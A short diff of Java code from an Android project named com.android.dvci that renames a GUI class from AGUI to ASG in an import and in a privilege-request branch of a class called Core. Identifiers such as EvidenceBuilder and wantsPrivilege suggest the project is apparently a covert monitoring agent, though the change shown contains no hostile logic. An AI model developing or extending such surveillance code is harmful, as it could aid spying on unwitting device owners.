@@ -34,7 +34,7 @@ import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.Markup;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
-import com.android.dvci.gui.AGUI;
+import com.android.dvci.gui.ASG;
 import com.android.dvci.listener.BSm;
 import com.android.dvci.listener.WR;
 import com.android.dvci.manager.ManagerEvent;
@@ -244,7 +244,7 @@ public class Core extends Activity implements Runnable {
 				Check.log(TAG + " Error (unprotect): " + ex);
 			}
 		} else if (Keys.self().wantsPrivilege()) {
-			AGUI gui = Status.getAppGui();
+			ASG gui = Status.getAppGui();
 
 			if (gui != null) {
 				if (Cfg.DEBUG) {
